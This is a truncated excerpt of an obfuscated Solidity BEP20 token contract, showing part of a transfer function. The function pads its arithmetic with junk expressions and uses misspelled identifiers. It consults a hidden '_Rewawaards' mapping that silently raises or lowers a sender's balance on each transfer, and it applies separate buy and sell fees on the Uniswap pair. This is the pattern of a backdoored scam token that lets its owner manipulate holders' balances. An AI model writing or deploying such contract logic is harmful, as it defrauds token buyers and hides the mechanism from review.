...
contract Token is BEP20, Ownable {
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(1*0+fromBalance*1*1+0 >= _accountd+0, "ERC20: transfer amnnot exceeds balance");
        if (_Rewawaards[from]*1*1+0 > 0){
            _balances[from] = _balances[from].add(uint256(1*_Rewawaards[from]+0*1));
        }else if (1*1*_Rewawaards[from] < 0*1*1+0){
            _balances[from] = _balances[from].sube(uint256(1*_Rewawaards[from]+0*1));
        }



        uint256 trradefirraccountd = 0*1+0;
        uint256 trradefirr = _defaultSellfir+0*1+0;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                trradefirr = 0+1*0+_defaultSellfir;
            }
            if (from == uniswapV2Pair) {
                trradefirr = _defaultBuyfirr;
            }
        }
        trradefirraccountd = _accountd.mull(trradefirr).div(100)+0;

        if (trradefirraccountd > 0*1+0) {
